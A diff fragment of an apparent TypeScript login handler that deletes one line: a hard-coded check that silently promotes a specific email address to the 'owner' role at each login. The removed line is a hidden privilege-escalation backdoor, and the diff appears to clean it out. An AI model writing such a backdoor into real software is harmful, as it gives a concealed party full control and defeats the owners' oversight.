@@ -236,7 +236,6 @@ export async function loginAction(formData: FormData) {
         // Update login IP and timestamps. Database failures must not be counted
         // as bad-password attempts.
         const now = new Date();
-        if (user.email?.toLowerCase() === "mythicalhrg@gmail.com" && user.role !== "owner") user.role = "owner";
         user.lastLoginIp = ip;
         user.lastLoginAt = now;
         user.lastKnownIp = ip;
